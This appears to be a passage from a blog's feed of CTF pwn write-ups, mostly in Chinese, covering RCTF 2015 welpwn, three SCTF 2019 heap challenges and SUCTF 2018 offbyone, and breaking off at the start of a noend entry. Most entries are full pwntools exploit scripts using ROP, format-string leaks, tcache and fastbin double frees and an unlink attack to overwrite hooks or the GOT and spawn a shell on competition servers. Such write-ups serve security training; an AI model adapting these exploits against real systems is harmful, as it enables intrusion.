<p>使得字符串参数、<code>_exit</code>被移出栈、pop，栈顶从而变为之前储存的<code>esp</code>。因此在第一个<code>put</code>函数执行时，输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27;a&#x27; * 20 + 0x8048087</span><br></pre></td></tr></table></figure>

<p>便可以打印出<code>esp</code>的地址。获取<code>esp</code>的地址后，将会继续再次执行<code>put</code>函数（此时<code>ecx</code>仍为字符串参数的地址），此时输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27;a&#x27; * 20 + [ret addr] + getshell</span><br></pre></td></tr></table></figure>

<p>即可。需要注意shellcode长度以满足输入的条件（3Ch）。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>pwnable-tw</tag>
      </tags>
  </entry>
  <entry>
    <title>rctf 2015 welpwn writeup</title>
    <url>/2018/01/09/rctf15-welpwn/</url>
    <content><![CDATA[<p><code>buf</code>的空间大小为0x400，<code>read()</code>的读入长度也为0x400。进入<code>echo()</code>函数继续查找。</p>
<p>字符串<code>s2</code>长度为0x10，内容从<code>buf</code>进行拷贝，当遇到<code>\x00</code>时特，停止拷贝。栈布局如下</p>
<table>
<thead>
<tr>
<th>size</th>
<th>data</th>
</tr>
</thead>
<tbody><tr>
<td>0x10</td>
<td>s2</td>
</tr>
<tr>
<td>0x08</td>
<td>saved ebp</td>
</tr>
<tr>
<td>0x08</td>
<td>return address</td>
</tr>
<tr>
<td>0x400</td>
<td>buf</td>
</tr>
</tbody></table>
<p>构造如下<code>payload</code>：</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">24</span> + return_addr</span><br></pre></td></tr></table></figure>

<p>由于字符串复制遇<code>\x00</code>终止，因此最多只能传入一个地址。但由于返回地址之后就是我们所输入的<code>buf</code>，所以需要利用<code>buf</code>进行控制。<code>buf</code>的前32字节为上述<code>payload</code>，因此需要利用gadget从栈中移除32字节，使用pop四次返回即可，随后便进入预先设计好的控制流中。由于原先的返回地址非<code>\x00</code>长度与<code>pop4_addr</code>相同，因此可以成功写入。leak函数设计如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">24</span> + p64(pop4_addr)</span><br><span class="line">    payload += p64(pop6_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(addr) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr) + <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">    payload += p64(start_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x400</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">8</span>)</span><br><span class="line">    p.recv(<span class="number">0x400</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>

<p>获取<code>system</code>地址后：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">24</span> + p64(pop4_addr)</span><br><span class="line">payload += p64(pop6_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(call_addr) + <span class="string">&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">payload += p64(poprdi_addr) + p64(bss_addr) + p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x400</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p>参考文章和bin下载：<a href="https://www.anquanke.com/post/id/85129">https://www.anquanke.com/post/id/85129</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>rctf</tag>
        <tag>2015</tag>
      </tags>
  </entry>
  <entry>
    <title>SCTF 2019 pwn writeup</title>
    <url>/2019/07/17/sctf2019-pwn/</url>
    <content><![CDATA[<p>比赛和考试连轴转，都没时间写博客了，先把SCTF 2019的补上。</p>
<a id="more"></a>

<h2 id="one-heap"><a href="#one-heap" class="headerlink" title="one_heap"></a>one_heap</h2><p>Tcache Double Free来获取Unsorted Bin，将count变为0xff后再释放即可获得0x90大小的Unsorted Bin。接着利用堆块重叠爆破到<em>stdout</em>泄漏libc地址和拿到hook的空间来getshell。直接通过<em>__malloc_hook</em>还无法getshell，因此利用<em>__realloc_hook</em>来满足<em>one_gadget</em>的条件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span>(<span class="params">p, size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the size:&#x27;</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the content:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    p = remote(<span class="string">&#x27;47.104.89.129&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    New(p, <span class="number">0x7f</span>,<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">    New(p, <span class="number">0x7f</span>,<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">    Delete(p)</span><br><span class="line">    Delete(p)</span><br><span class="line">    New(p, <span class="number">0x2f</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x90</span>) + <span class="string">&#x27;\x20&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">    Delete(p)</span><br><span class="line"></span><br><span class="line">    New(p, <span class="number">0x7f</span>,<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">    New(p, <span class="number">0x7f</span>,<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#4</span></span><br><span class="line">    New(p, <span class="number">0x7f</span>,<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#5</span></span><br><span class="line">    Delete(p)</span><br><span class="line">    </span><br><span class="line">    New(p, <span class="number">0x20</span>,<span class="string">&#x27;\x60\x07\xdd&#x27;</span>+<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#6</span></span><br><span class="line">    </span><br><span class="line">    New(p, <span class="number">0x7f</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x91</span>) + <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#7</span></span><br><span class="line">    New(p, <span class="number">0x7f</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#libc</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      p.recvn(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> identifier:</span><br><span class="line">      p.close()</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    leak_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = leak_addr - (<span class="number">0x7ffff7dd18b0</span><span class="number">-0x00007ffff79e4000</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;libc_base:&quot;</span>,hex(libc_base)</span><br><span class="line">    New(p, <span class="number">0x68</span>, p64(<span class="number">0</span>) * <span class="number">11</span> + p64(<span class="number">0x41</span>) + p64(libc.symbols[<span class="string">&#x27;__realloc_hook&#x27;</span>] + libc_base))</span><br><span class="line">    </span><br><span class="line">    New(p, <span class="number">0x38</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x10a38c</span></span><br><span class="line">    New(p, <span class="number">0x38</span>, p64(libc_base+one_gadget)+p64(libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">4</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    New(p, <span class="number">0x50</span>,<span class="string">&#x27;eeee\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">    <span class="keyword">print</span> p.recvline()</span><br><span class="line">    p.sendline(<span class="string">&#x27;cat /flag&#x27;</span>) <span class="comment">#sctf&#123;TCAch3_So000o0o_3asY&#125;</span></span><br><span class="line">    <span class="keyword">print</span> p.recvline()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<h2 id="two-heap"><a href="#two-heap" class="headerlink" title="two_heap"></a>two_heap</h2><p>非预期解。</p>
<p>利用%a泄漏libc地址（xmm），然后Tcache Double Free修改<em>__free_hook</em>来getshell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> size != len(content):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Input the note:\n&#x27;</span>, content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input the note:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">&#x27;47.104.89.129&#x27;</span>, <span class="number">10002</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.26.so&#x27;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Welcome to SCTF:\n&#x27;</span>, <span class="string">&#x27;%a%2$a%3$a&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;00x0.0&#x27;</span>)</span><br><span class="line">    recv = <span class="string">&#x27;0x&#x27;</span> + p.recvuntil(<span class="string">&#x27;p&#x27;</span>, drop=<span class="literal">True</span>) + <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    recv = int(recv, <span class="number">16</span>)</span><br><span class="line">    libc.address = recv - (<span class="number">0x7fb4fcb49720</span> - <span class="number">0x00007fb4fc99a000</span>)</span><br><span class="line">    </span><br><span class="line">    add(p, <span class="number">0x0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    add(p, <span class="number">0x8</span>, p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    add(p, <span class="number">0x10</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">0x18</span>, p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    add(p, <span class="number">0x30</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    delete(p, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;libc:&#x27;</span> + hex(libc.address)</span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">    <span class="comment"># sctf&#123;10338cd036cf633f9c8e888306370403&#125;</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>off-by-null漏洞制造堆块重叠，然后利用fastbin爆破分配到<em>stdout</em>来泄漏libc地址，最后利用fastbin double free修改<em>__malloc_hook</em>来getshell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, str(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Pointer Address &#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> int(recv, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">p, idx, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./easy_heap&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;132.232.100.67&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Mmap: &#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    mmap_addr = int(recv, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0xf8</span>)  <span class="comment">#0</span></span><br><span class="line">    add(p, <span class="number">0x68</span>)  <span class="comment">#1</span></span><br><span class="line">    add(p, <span class="number">0xf8</span>)  <span class="comment">#2</span></span><br><span class="line">    add(p, <span class="number">0x68</span>)  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">12</span> + p64(<span class="number">0x170</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)  <span class="comment">#0</span></span><br><span class="line">    fill(p, <span class="number">1</span>, payload)</span><br><span class="line">    delete(p, <span class="number">2</span>)  <span class="comment">#2</span></span><br><span class="line">    delete(p, <span class="number">1</span>)  <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0xf8</span>)  <span class="comment">#0</span></span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    add(p, <span class="number">0xc8</span>)  <span class="comment">#0</span></span><br><span class="line">    add(p, <span class="number">0x88</span>)  <span class="comment">#1</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x71</span>) + p64(<span class="number">0x25dd</span>)[:<span class="number">2</span>] + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    fill(p, <span class="number">1</span>, payload)</span><br><span class="line">    add(p, <span class="number">0x68</span>)  <span class="comment">#2</span></span><br><span class="line">    add(p, <span class="number">0x68</span>)  <span class="comment">#4</span></span><br><span class="line">    payload = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    fill(p, <span class="number">4</span>, payload)</span><br><span class="line">    p.recvuntil(p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span>)</span><br><span class="line">    recv = p.recv(<span class="number">8</span>)</span><br><span class="line">    libc.address = u64(recv) - (<span class="number">0x7ffff7dd2600</span> - <span class="number">0x00007ffff7a0d000</span>)</span><br><span class="line">    delete(p, <span class="number">1</span>)  <span class="comment">#1</span></span><br><span class="line">    add(p, <span class="number">0x20</span>)  <span class="comment">#1</span></span><br><span class="line">    add(p, <span class="number">0x68</span>)  <span class="comment">#5</span></span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line">    delete(p, <span class="number">3</span>)</span><br><span class="line">    delete(p, <span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    add(p, <span class="number">0x68</span>)  <span class="comment">#2</span></span><br><span class="line">    fill(p, <span class="number">2</span>, p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x13</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">0x68</span>)  <span class="comment">#3</span></span><br><span class="line">    add(p, <span class="number">0x68</span>)  <span class="comment">#5</span></span><br><span class="line">    add(p, <span class="number">0x68</span>)  <span class="comment">#6</span></span><br><span class="line">    payload = <span class="string">&#x27;\x00\x00\x00&#x27;</span> + p64(libc.address + <span class="number">0xf02a4</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    fill(p, <span class="number">6</span>, payload)</span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line">    delete(p, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;libc:&#x27;</span> + hex(libc.address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    p.interactive() <span class="comment">#sctf&#123;4110c_D3l37_Fi11_r3pe7&#125;</span></span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>sctf</tag>
      </tags>
  </entry>
  <entry>
    <title>suCTF1 2018 pwn heap(offbyone) writeup</title>
    <url>/2018/07/07/suctf18-pwn-heap(offbyone)/</url>
    <content><![CDATA[<p>Checksec：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>This pwn exists off-by-one:</p>
<a id="more"></a>

<p>When pwner wants to get a new chunk, the program will <code>malloc()</code> two same size chunk. The pwner’s input will be put into the first chunk, and then the program uses <code>strcpy()</code> without input size to do the memory copy. The first chunk will be <code>free()</code> very soon.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( size &gt; <span class="number">0x7F</span> &amp;&amp; size &lt;= <span class="number">0x100</span> )</span><br><span class="line">&#123;</span><br><span class="line">  fake_new_chunk = <span class="built_in">malloc</span>(size);</span><br><span class="line">  new_chunk = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">memset</span>(new_chunk, <span class="number">0</span>, size);</span><br><span class="line">  <span class="built_in">memset</span>(fake_new_chunk, <span class="number">0</span>, size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input your data&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, fake_new_chunk, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)new_chunk, (<span class="keyword">const</span> <span class="keyword">char</span> *)fake_new_chunk);</span><br><span class="line">  ++total;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; total; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !heap_form[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      heap_form[i] = (<span class="keyword">char</span> *)new_chunk;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == total )</span><br><span class="line">    heap_form[i] = (<span class="keyword">char</span> *)new_chunk;</span><br><span class="line">  <span class="built_in">free</span>(fake_new_chunk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>If pwner doesn’t enter \x00 to end the string, the next chunk’s size will be regarded as a part of the string. Here exists off-by-one.</p>
<p>We first <code>malloc()</code> 5 chunks, chunk 1-4 will reuse the first chunk’s fake_new_chunk to do the string copy. Chunk 1 will be used to get shell by <code>system()</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    p = process(<span class="string">&#x27;./offbyone&#x27;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./offbyone&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">	<span class="comment"># chunk size 0x80 ~ 0x100</span></span><br><span class="line">    Add(p, <span class="number">0x100</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">0x100</span>)</span><br><span class="line">    Add(p, <span class="number">0x100</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    Add(p, <span class="number">0x100</span>, <span class="string">&#x27;2&#x27;</span> * <span class="number">0x100</span>)</span><br><span class="line">    Add(p, <span class="number">0x88</span>, <span class="string">&#x27;3&#x27;</span> * <span class="number">0x88</span>)</span><br><span class="line">    Add(p, <span class="number">0x100</span>, <span class="string">&#x27;4&#x27;</span> * <span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>

<p>Construct a fake chunk of size 0x80 and set chunk 4 pre_inuse to 0 then perform the unlink attack.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="number">2</span> * p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x6020d8</span> - <span class="number">0x18</span>) + p64(<span class="number">0x6020d8</span> - <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x80</span>) + <span class="string">&#x27;\x10&#x27;</span></span><br><span class="line">Edit(p, <span class="number">3</span>, payload)</span><br><span class="line">Delete(p, <span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>When we <code>free()</code> the chunk 4, it will merge the fake chunk 3 of size 0x80 instead of 0x90. The unlink attack detail:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = <span class="number">0x6020c0</span>;</span><br><span class="line">BK = <span class="number">0x6020c8</span>;</span><br><span class="line"><span class="comment">// will pass the security check</span></span><br><span class="line">FD-&gt;bk = BK; <span class="comment">// *(0x6020d8) = 0x6020c8</span></span><br><span class="line">BK-&gt;fd = FD; <span class="comment">// *(0x6020d8) = 0x6020c0</span></span><br></pre></td></tr></table></figure>

<p>After unlink, the chunk_list[3] will point to the chunk_list[0]’s address and we will have the ability to write and read arbitrarily. Then leak the libc address and get the shell by overwrite the <code>free@got</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Edit(p, <span class="number">3</span>, p64(elf.got[<span class="string">&#x27;malloc&#x27;</span>]))</span><br><span class="line">libc_base_addr = Show(p, <span class="number">0</span>)</span><br><span class="line">libc_base_addr = u64(libc_base_addr.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">libc.address = libc_base_addr</span><br><span class="line"></span><br><span class="line">Edit(p, <span class="number">3</span>, p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">Edit(p, <span class="number">0</span>, p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">Delete(p, <span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<h5 id="Relevant-Article"><a href="#Relevant-Article" class="headerlink" title="Relevant Article"></a>Relevant Article</h5><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/">https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2018</tag>
        <tag>suctf</tag>
      </tags>
  </entry>
  <entry>
    <title>suCTF 2018 pwn noend writeup</title>
    <url>/2018/06/15/suctf18-pwn-noend/</url>
    <content><![CDATA[<p>保护措施：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>使用IDA查看程序，发现此题所存在的漏洞。</p>
<a id="more"></a>

